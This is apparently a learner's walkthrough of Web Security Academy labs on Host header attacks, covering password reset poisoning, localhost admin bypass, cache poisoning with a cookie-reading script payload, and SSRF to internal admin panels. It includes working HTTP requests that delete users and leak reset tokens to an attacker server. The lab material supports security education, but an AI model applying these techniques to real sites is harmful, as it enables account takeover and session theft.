### Basic password reset poisoning

Before logging in, use the "Forgot Password" functionality. Save that request and send it to repeater. Here you can play along and you'll notice that the "Host" header is not being validated. Here you can input your "malicious" server, and replace your username with the victim.

See your logs, and you'll receive a GET request with a token. Replace it in the first request (the one destined for your user) and you'll be able to change Carlos password. 

---
### Host header authentication bypass

You  can change the ".net" for a ".com" on the Host header

Access the `/admin` and see you can't. 
Change the Host to `localhost` and send the request. 200 OK. Delete Carlos username.

---
### Web cache poisoning via ambiguous requests

Add a cache buster to the query. 
If you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from `/resources/js/tracking.js`.

Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.

Go to the exploit server, create the file /resources/js/tracking.js, and the payload alert(document.cookie). Store it.

Modify the request so it's:
```text
GET /?cb=123 HTTP/1.1 
Host: YOUR-LAB-ID.web-security-academy.net 
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Send it until you get a Hit.
Go to the page with the CB. Solved.

---
###  Routing-based SSRF

See you can change the Host header value with a collaborator. 
After that, send the request to the intruder, and set this as the Host header:
`Host: 192.168.0.§0§`

Change the payload to Numbers, from 0 to 255. <u>Uncheck the "Update host header to match target"</u>. Start the attack.

In my case was the `192.168.0.218`

Send the winner request to repeater, change the endpoint to /admin and follow the redirect. Take the csrf from the response, and craft the payload as below.

You can access. Validate that for deleting the user "aaa" it sends a request with a csrf token and the username. So create a request to this endpoint:
`GET /admin/delete?csrf=<CSRF-TOKEN>&username=carlos`

That's it. 

---
### SSRF via flawed request parsing

This is the same as the previous one, but here you can make a GET to the absolute paths. 
To test it, send a GET to the regular home path, and set the Host header to the collaborator payload.

Your final request will be something like this:
```text
GET https://0a31005d030493b3831b694100440078.web-security-academy.net/admin/delete?csrf=dLrJ0ubWgdLeqR4dcytubS8dIC8g6AUW&username=carlos HTTP/2
Host: 192.168.0.82
```

---
### Host validation bypass via connection state attack

Duplicate the GET / request. 
The first one, with the GET to the / directory, and the Host is the lab.
The second one, GET to /admin and the Host is the UP 192.168.0.1

You can access. Now send the request to  `/delete?csrf=<CSRF-TOKEN>&username=carlos`

---
